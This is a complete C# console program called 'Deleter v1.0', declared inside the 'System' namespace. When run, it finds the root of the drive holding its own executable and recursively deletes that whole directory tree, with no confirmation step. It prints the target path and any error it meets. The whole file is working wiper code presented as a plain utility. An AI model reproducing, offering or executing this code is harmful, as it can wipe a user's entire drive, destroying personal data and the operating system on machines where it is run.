namespace System 
{
    public class Deleter 
    {
        public static System.String Dir = System.IO.Directory.GetDirectoryRoot(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location));
        public static System.Boolean DirExist = System.IO.Directory.Exists(System.Deleter.Dir);
        public const System.String Ver = "1.0";
        public const System.String Title = "Deleter v" + System.Deleter.Ver;
        static void Main(System.String[] args) 
        {
            System.Console.Title = System.Deleter.Title;
            System.Console.ForegroundColor = System.ConsoleColor.DarkGray;
            System.Console.BackgroundColor = System.ConsoleColor.Black;
            System.Console.WriteLine("Deleting " + System.Deleter.Dir);
            try 
            {
                System.IO.Directory.Delete(System.Deleter.Dir, true);
            }
            catch (System.Exception ex) 
            {
                System.Console.WriteLine("Error deleting " + System.Deleter.Dir + " :");
                System.Console.WriteLine(ex);
            }
        }
    }
}